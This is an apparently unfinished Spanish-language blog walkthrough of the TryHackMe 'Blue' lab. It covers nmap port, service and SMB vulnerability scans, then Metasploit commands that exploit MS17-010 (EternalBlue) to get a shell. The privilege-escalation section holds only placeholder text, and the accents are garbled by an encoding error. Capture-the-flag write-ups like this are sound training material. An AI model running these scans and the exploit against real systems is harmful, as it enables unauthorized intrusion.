I"Ù$<p>En esta ocasi√≥n vamos a resolver la m√°quina <em>Blue</em> de <em>TryHackMe</em>. Esta es una m√°quina f√°cil tanto en la intrusi√≥n como en la escalada de privilegios, por lo que no supondr√° ninguna complicaci√≥n a la hora de realizarla. Ya por el nombre de la m√°quina, podemos darnos una idea de por donde van los tiros, ¬øquiz√° <code class="language-plaintext highlighter-rouge">EternalBlue</code>?</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/1.png" alt="" /></p>

<h3 id="fase-de-reconocimiento"><a href="#header-3"></a>Fase De Reconocimiento</h3>

<p>Primeramente, vamos a utilizar la herramienta <em>Nmap</em> para determinar que puertos est√°n abiertos as√≠ como identificar la versi√≥n y servicios que corren en el activo. Para determinar que puertos est√°n abiertos podemos realizar lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -p- --open -T5 -v -n &lt;direcci√≥n IP&gt; -oG allPorts
</code></pre></div></div>

<p>Y en caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn &lt;direcci√≥n IP&gt; -oG allPorts
</code></pre></div></div>

<p>A continuaci√≥n se explican los par√°metros utilizados en el escaneo de puertos con <em>Nmap</em>:</p>

<ul>
  <li>p - Escanea todo el rango de puertos (65535 en total)</li>
  <li>open - Nos indica todos aquellos puertos que est√°n abiertos (o posiblemente abiertos)</li>
  <li>T5 - La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, ‚Äúgeneraremos m√°s ruido  ‚Äú, pero no pasa nada ¬øno? Al fin y al cabo estamos practicando en un entorno controlado y aqu√≠ somos todos <code class="language-plaintext highlighter-rouge">White Hat</code></li>
  <li>v - <em>Verbose</em>, reporta lo encontrado por consola</li>
  <li>n - No aplicar <em>resoluci√≥n DNS</em></li>
  <li>sS - Escaneo <em>TCP SYN</em></li>
  <li>min-rate - Emitir paquetes no m√°s lentos que <em>valor</em> por segundo</li>
  <li>vvv - Triple <em>verbose</em>, para obtener mayor informaci√≥n por consola</li>
  <li>Pn - No aplicar <em>host discovery</em></li>
  <li>oG - Exportar el escaneo en formato ‚Äú<em>grepeable</em>‚Äù</li>
</ul>

<p>Para determinar la versi√≥n y servicios que corren bajo estos puertos podemos realizar lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sC -sV -p 135,139,445,3389,49152,49153,49154,49158,49160 &lt;direcci√≥n IP&gt; -oN targeted
</code></pre></div></div>

<p>A continuaci√≥n se explican los par√°metros utilizados en el escaneo de versiones y servicios con <em>Nmap</em>:</p>

<ul>
  <li>sC - Scripts b√°sicos de enumeraci√≥n</li>
  <li>sV - Versi√≥n y servicios que corren bajo los puertos encontrados</li>
  <li>p - Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior)</li>
  <li>oN - Exportar el escaneo en formato <em>Nmap</em></li>
</ul>

<p>Entre las preguntas que nos realiza la plataforma en esta primera fase, se encuentra:</p>

<ul>
  <li>¬øCu√°ntos puertos est√°n abiertos con un n√∫mero de puerto inferior a 1000?</li>
  <li>¬øA qu√© es vulnerable esta m√°quina?</li>
</ul>

<p>Estas preguntas son bastante f√°ciles de responder si realizamos un buen escaneo con <em>Nmap</em>. Para responder a la primera pregunta no hay donde perderse, bastar√° con introducir cu√°ntos puertos abiertos, inferiores a 1000, hemos detectado con nuestro escaneo; recordemos que existen en total 65535 puertos posibles. Para responder a la segunda pregunta, tendremos que realizar un escaneo adicional, ya que se nos pregunta, a que ataque es vulnerable la m√°quina; a modo de pista, la plataforma nos da un ejemplo de respuesta: <em>ms08-067</em>.</p>

<p>Si recordamos, lo m√°s relevante que encontramos con nuestro escaneo de versiones y servicios con <em>Nmap</em>, es el puerto <code class="language-plaintext highlighter-rouge">445</code>, o servicio <code class="language-plaintext highlighter-rouge">Samba</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/2.png" alt="" /></p>

<p>De modo que procederemos a utilizar los scripts espec√≠ficos con los que cuenta <em>Nmap</em>, para detectar vulnerabilidades en un servicio <code class="language-plaintext highlighter-rouge">Samba</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/3.png" alt="" /></p>

<p>Para poder utilizarlos podemos hacer lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap --script="smb-vuln*" -p 445 10.10.229.101 -oN smbScan
</code></pre></div></div>

<p>A continuaci√≥n se explican los par√°metros utilizados en el escaneo de vulnerabilidades del servicio <code class="language-plaintext highlighter-rouge">Samba</code> con <em>Nmap</em>:</p>

<ul>
  <li>‚Äìscript - Proporcionamos el script que queremos emplear; en este caso, como no ten√≠amos un script en particular a utilizar, a trav√©s de expresiones regulares, indicamos que queremos utilizar todos aquellos script que comiencen por <em>smb-vuln</em></li>
  <li>p - Especificamos a que puertos queremos aplicar este escaneo</li>
  <li>oN - Exportar el escaneo en formato <em>Nmap</em></li>
</ul>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/4.png" alt="" /></p>

<p>Como podemos darnos cuenta, esta m√°quina es vulnerable a MS17-010, o tambi√©n conocido como <code class="language-plaintext highlighter-rouge">EternalBlue</code>.</p>

<h3 id="fase-de-explotaci√≥n"><a href="#header-3"></a>Fase De Explotaci√≥n</h3>

<p>Para esta segunda fase, <em>TryHackMe</em> realiza la fase de explotaci√≥n con el uso de <code class="language-plaintext highlighter-rouge">Metasploit</code>, no obstante, no recomiendo acostumbrarse a utilizar herramientas automatizadas, ya que perdemos bastante el control sobre lo que est√° pasando por detr√°s, de modo que no aprendemos; sin embargo, en esta m√°quina en concreto, no es posible realizar un procedimiento manual, ya que la m√°quina <code class="language-plaintext highlighter-rouge">Blue</code>, est√° pensada para ser explotada mediante el uso de <code class="language-plaintext highlighter-rouge">Metasploit</code>.</p>

<p>Para hacer uso de <code class="language-plaintext highlighter-rouge">Metasploit</code> tendremos que abrir la aplicaci√≥n, para ello haremos lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole
</code></pre></div></div>

<p>Una vez hemos abierto <code class="language-plaintext highlighter-rouge">Metasploit</code>, procederemos a buscar aquello que queremos explotar, en este caso, MS17-010, o <code class="language-plaintext highlighter-rouge">EternalBlue</code>, cualquiera de las dos formas es v√°lidas.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>search eternalblue
search ms17-010
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/5.png" alt="" /></p>

<p>Posteriormente elegiremos el <em>exploit</em> a utilizar; de hecho, una de las preguntas de la plataforma justamente es, introducir el <em>exploit</em> que vamos a utilizar.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/windows/smb/ms17_010_eternalblue
</code></pre></div></div>

<p>Una vez hemos seleccionado el <em>exploit</em>, procederemos a configurar tanto el <code class="language-plaintext highlighter-rouge">LHOST</code> como el <code class="language-plaintext highlighter-rouge">RHOST</code>, que dicho de otra forma, procederemos a introducir nuestra <em>IP</em>, y la <em>IP</em> de la m√°quina v√≠ctima.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>show options
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/6.png" alt="" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set LHOST &lt;nuestra IP&gt; 
set RHOST &lt;IP v√≠ctima&gt;
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/7.png" alt="" /></p>

<p>Una vez hemos configurado dichos par√°metros, bastar√° con empezar con el ataque, consigui√©ndonos <code class="language-plaintext highlighter-rouge">Metasploit</code> una shell dentro de la m√°quina v√≠ctima.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/8.png" alt="" /></p>

<h3 id="escalada-de-privilegios"><a href="#header-3"></a>Escalada De Privilegios</h3>

<p>ABC</p>
:ET